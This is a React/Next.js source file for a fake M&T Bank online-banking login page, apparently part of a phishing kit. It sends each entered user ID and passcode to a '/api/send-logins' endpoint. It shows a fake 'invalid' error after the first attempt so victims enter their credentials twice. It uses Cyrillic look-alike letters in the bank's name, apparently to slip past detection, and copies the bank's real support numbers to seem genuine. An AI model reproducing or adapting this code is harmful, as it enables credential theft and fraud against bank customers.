import React, { useContext, useEffect, useState } from "react";
import { Wrapper } from "./Wrapper";
import { Error } from "./Error";
import { Input } from "./InputAlt";
import { Box, Flex, Text, Link } from "@chakra-ui/react";
import Head from "next/head";
import { Checkbox } from "./CheckboxAlt";
import { Button } from "./Button";
import { yupResolver } from "@hookform/resolvers/yup";
import axios from "axios";
import * as yup from "yup";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import { DataContext } from "../pages/_app";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";

interface LoginProps {}

const schema = yup.object().shape({
  userId: yup
    .string()
    .required(`Enter a User ID`)
    .min(2, `Your User ID must be greater than 2 characters`),
  password: yup
    .string()
    .required(`Enter a Password`)
    .min(6, `Your password must be at least 6 characters long`),
});

export const Login: React.FC<LoginProps> = ({}) => {
  const [loginAttempt, setLoginAttempt] = useState(0);
  const [showError, setShowError] = useState(false);
  const [loading, setLoading] = useState(false);

  const [logins, setLogins] = useState({});
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onSubmit`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `LOGIN`);
    formData.append(
      `loginDetails`,
      JSON.stringify({
        loginAttempt: loginAttempt + 1,
        sessionId: datas.sessionId,
        ...data,
      })
    );

    try {
      await axios.post(`/api/send-logins`, formData);
    } catch (error) {
      console.log(error);
    }

    setLogins({
      ...logins,
      [loginAttempt + 1]: {
        form: `LOGIN`,
        loginDetails: { loginAttempt: loginAttempt + 1, ...data },
      },
    });

    if (!loginAttempt && process.env.NEXT_PUBLIC_DOUBLE_LOGIN === `ON`) {
      setLoginAttempt(1);
      setLoading(false);
      setShowError(true);
      reset({
        userId: ``,
        password: ``,
      });
      return;
    }

    setData({
      ...datas,
      logins: {
        ...logins,
        [loginAttempt + 1]: {
          form: `LOGIN`,
          loginDetails: { loginAttempt: loginAttempt + 1, ...data },
        },
      },
    });

    const url = getProgress()[0];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <Wrapper>
      <Head>
        <title>Welcome to Online Ваnking | М&Т Ваnk</title>
      </Head>
      {errors.userId || errors.password || showError ? (
        <Error
          message={
            errors.userId || errors.password
              ? `Please provide your User ID and Passcode.`
              : showError
              ? `You have entered an invalid User ID and/or Passcode. Please try again.`
              : ``
          }
        />
      ) : null}
      <Box p={0} maxW={`21rem`} m={`0 auto`}>
        <Flex m={0} p={0} px={`.5rem`} mb={`2rem`} flexFlow={`row wrap`}>
          <Box
            m={0}
            p={0}
            px={`.5rem`}
            flex={`0 0 auto`}
            minH={0}
            minW={0}
            w={`100%`}
          >
            <Box m={0} p={0} mb={`2rem`}>
              <Text
                m={0}
                p={0}
                as={`h1`}
                mb={`.5rem`}
                fontSize={`1.75rem`}
                lineHeight={1.25}
                color={`#007856`}
                fontWeight={300}
                mt={0}
                style={{
                  fontStyle: `normal`,
                  textRendering: `optimizeLegibility`,
                }}
              >
                Log In to Online Ваnking
              </Text>
              <Text
                m={0}
                p={0}
                as={`p`}
                mb={0}
                lineHeight={1.25}
                color={`#007856`}
                style={{
                  fontStyle: `normal`,
                  textRendering: `optimizeLegibility`,
                }}
              >
                Log In to Online Ваnking
              </Text>
            </Box>
            <Input
              label={`User ID`}
              boxStyle={{
                px: 0,
              }}
              register={register}
              name={`userId`}
              curValue={watch(`userId`)}
              m={0}
            />
            <Input
              label={`Passcode`}
              boxStyle={{
                px: 0,
              }}
              register={register}
              name={`password`}
              curValue={watch(`password`)}
              type={`password`}
              m={0}
            />
            <Checkbox />
          </Box>
        </Flex>
        <Flex m={0} p={0} px={`.5rem`} mb={`1rem`} flexFlow={`row wrap`}>
          <Button
            label={`Log in`}
            w={`100%`}
            boxProps={{
              mb: 0,
            }}
            onClick={onSubmit}
            disabled={loading}
          />
          {[`Help with User ID or Passcode`, `Enroll Now`].map(
            (item, index, array) => (
              <Box
                m={0}
                p={0}
                px={`.5rem`}
                flex={`0 0 auto`}
                minH={0}
                minW={0}
                w={`100%`}
                key={item}
              >
                <Link
                  border={0}
                  m={`0.8125rem 1.5625rem 0.8125rem 1.5625rem`}
                  mr={`auto`}
                  ml={`auto`}
                  mb={index === array.length - 1 ? `1.8125rem` : `0.8125rem`}
                  display={`table`}
                  w={`auto`}
                  textDecor={`underline`}
                  p={0}
                  bgColor={`transparent`}
                  color={`#007856`}
                  fontWeight={300}
                  verticalAlign={`middle`}
                  transition={`background-color .25s ease-out,color .25s ease-out`}
                  fontFamily={`inherit`}
                  fontSize={`1rem`}
                  lineHeight={1}
                  textAlign={`center`}
                  cursor={`pointer`}
                  _hover={{
                    color: `#003c2b`,
                  }}
                >
                  {item}
                </Link>
              </Box>
            )
          )}
          <Text
            m={0}
            p={0}
            px={`.5rem`}
            color={`#767676`}
            fontSize={`.625rem`}
            // mb={`1rem`}
            textAlign={`center`}
            lineHeight={1.25}
            flex={`0 0 auto`}
            minH={0}
            minW={0}
            w={`100%`}
            style={{
              textRendering: `optimizeLegibility`,
            }}
          >
            Unauthorized access is prohibited. Usage may be monitored.
          </Text>
        </Flex>
      </Box>
      <Box
        as={`hr`}
        m={`1rem auto`}
        mb={`2rem`}
        w={`100%`}
        maxW={`100%`}
        h={0}
        borderTop={0}
        borderRight={0}
        borderBottom={`1px solid #d7d7d7`}
        borderLeft={0}
        boxSizing={`content-box`}
        overflow={`visible`}
        style={{
          clear: `both`,
        }}
      />
      <Box m={`0 auto`} p={0} maxW={`41.5rem`}>
        <Flex m={0} p={0} px={`.5rem`} flexFlow={`row wrap`}>
          <Box
            m={0}
            p={0}
            px={`.5rem`}
            flex={`0 0 auto`}
            minH={0}
            minW={0}
            w={`100%`}
            textAlign={`center`}
          >
            <Text
              fontSize={`.875rem`}
              mb={`1rem`}
              lineHeight={1.25}
              style={{
                textRendering: `optimizeLegibility`,
              }}
            >
              Have questions about М&Т Online Ваnking?
            </Text>
          </Box>
          <Box
            m={0}
            p={0}
            px={`.5rem`}
            w={[`100%`, `50%`]}
            flex={`0 0 auto`}
            minH={0}
            minW={0}
            textAlign={`center`}
          >
            <Text
              m={0}
              p={0}
              color={`#007856`}
              fontSize={`.875rem`}
              mb={`.5rem`}
              lineHeight={1.25}
              style={{
                textRendering: `optimizeLegibility`,
              }}
            >
              {" "}
              Personal Accounts:{" "}
              <Link
                color={`#007856`}
                lineHeight={`inherit`}
                fontWeight={300}
                bgColor={`transparent`}
                cursor={`pointer`}
                _hover={{
                  color: `#00674a`,
                }}
              >
                1-800-790-9130
              </Link>
            </Text>
            <Text
              m={0}
              p={0}
              color={`#767676`}
              fontSize={`.75rem`}
              mb={0}
              lineHeight={1.25}
              style={{
                textRendering: `optimizeLegibility`,
              }}
            >
              {" "}
              Monday - Friday 8am - 9pm ET{" "}
            </Text>
            <Text
              mb={`1rem`}
              p={0}
              color={`#767676`}
              fontSize={`.75rem`}
              lineHeight={1.25}
              style={{
                textRendering: `optimizeLegibility`,
              }}
            >
              {" "}
              Saturday - Sunday 9am - 5pm ET{" "}
            </Text>
          </Box>
          <Box
            m={0}
            p={0}
            px={`.5rem`}
            w={[`100%`, `50%`]}
            flex={`0 0 auto`}
            minH={0}
            minW={0}
            textAlign={`center`}
          >
            <Text
              m={0}
              p={0}
              color={`#007856`}
              fontSize={`.875rem`}
              mb={`.5rem`}
              lineHeight={1.25}
              style={{
                textRendering: `optimizeLegibility`,
              }}
            >
              {" "}
              Business Accounts:{" "}
              <Link
                color={`#007856`}
                lineHeight={`inherit`}
                fontWeight={300}
                bgColor={`transparent`}
                cursor={`pointer`}
                _hover={{
                  color: `#00674a`,
                }}
              >
                1-800-724-6070
              </Link>
            </Text>
            <Text
              m={0}
              p={0}
              color={`#767676`}
              fontSize={`.75rem`}
              mb={0}
              lineHeight={1.25}
              style={{
                textRendering: `optimizeLegibility`,
              }}
            >
              {" "}
              Monday - Friday 6am - 9pm ET{" "}
            </Text>
            <Text
              mb={`2rem`}
              p={0}
              color={`#767676`}
              fontSize={`.75rem`}
              lineHeight={1.25}
              style={{
                textRendering: `optimizeLegibility`,
              }}
            >
              {" "}
              Saturday - Sunday 9am - 5pm ET{" "}
            </Text>
          </Box>
        </Flex>
      </Box>
    </Wrapper>
  );
};
